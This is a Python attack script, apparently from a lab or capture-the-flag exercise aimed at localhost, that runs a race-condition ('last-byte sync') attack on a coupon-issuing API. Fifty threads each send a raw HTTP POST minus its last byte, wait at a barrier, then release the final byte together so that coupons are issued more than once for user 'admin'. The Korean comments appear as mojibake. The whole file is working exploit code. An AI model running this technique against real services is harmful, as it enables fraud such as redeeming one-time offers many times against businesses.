import socket
import threading
import time
from urllib.parse import urlparse

# --- íƒ€ê²Ÿ ì„¤ì • ---
TARGET_URL = "http://localhost:8080/api/coupon/issue"
TARGET_USERNAME = "admin"
THREAD_COUNT = 50
# ----------------

# URL íŒŒì‹±
parsed = urlparse(TARGET_URL)
HOST = parsed.hostname
PORT = parsed.port if parsed.port else 80
PATH = parsed.path

# HTTP ìš”ì²­ ë³¸ë¬¸ ìƒì„±
BODY = f"username={TARGET_USERNAME}"
CONTENT_LENGTH = len(BODY)

# Raw HTTP ìš”ì²­ ìƒì„± (ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ ì œì™¸)
# ì£¼ì˜: \r\n ì¤„ë°”ê¿ˆ ì‚¬ìš©
request_headers = f"""POST {PATH} HTTP/1.1\r
Host: {HOST}:{PORT}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {CONTENT_LENGTH}\r
Connection: keep-alive\r
\r
"""

# ì „ì²´ ìš”ì²­ ë°ì´í„° (í—¤ë” + ë°”ë””)
full_payload = request_headers.encode() + BODY.encode()

# ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ë¥¼ ì œì™¸í•œ ë°ì´í„°
partial_payload = full_payload[:-1]
# ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸
last_byte = full_payload[-1:]

# ë™ê¸°í™”ë¥¼ ìœ„í•œ ì¥ë²½ (Barrier)
barrier = threading.Barrier(THREAD_COUNT)

def attack_worker(thread_id):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        
        # 1. ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ ë¹¼ê³  ì „ì†¡ (ì„œë²„ëŠ” ì•„ì§ ì²˜ë¦¬ ì‹œì‘ ì•ˆ í•¨, ë°ì´í„° ëŒ€ê¸° ì¤‘)
        s.sendall(partial_payload)
        
        # 2. ëª¨ë“  ìŠ¤ë ˆë“œê°€ ì—¬ê¸°ê¹Œì§€ ì˜¬ ë•Œê¹Œì§€ ëŒ€ê¸°
        barrier.wait()
        
        # 3. "ë•…!" ë™ì‹œì— ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ ì „ì†¡ (ì´ë•Œ ì„œë²„ê°€ ì²˜ë¦¬ ì‹œì‘)
        s.sendall(last_byte)
        
        # 4. ì‘ë‹µ ì½ê¸°
        response = s.recv(4096).decode(errors='ignore')
        
        if "ì¶•í•˜í•©ë‹ˆë‹¤" in response:
            print(f"âœ… Success! (T-{thread_id})")
        # ì‹¤íŒ¨ ë¡œê·¸ëŠ” ë„ˆë¬´ ë§ì•„ì„œ ìƒëµ (í•„ìš”í•˜ë©´ ì£¼ì„ í•´ì œ)
        # elif "ì´ë¯¸" in response:
        #     print(".", end="", flush=True)

    except Exception as e:
        print(f"Error (T-{thread_id}): {e}")
    finally:
        s.close()

print(f"ğŸ”¥ Socket-Level Last-Byte Sync Attack Starting... ({THREAD_COUNT} threads)")
print("Preparing connections...")

threads = []
for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_worker, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("\nğŸš€ Attack Completed.")
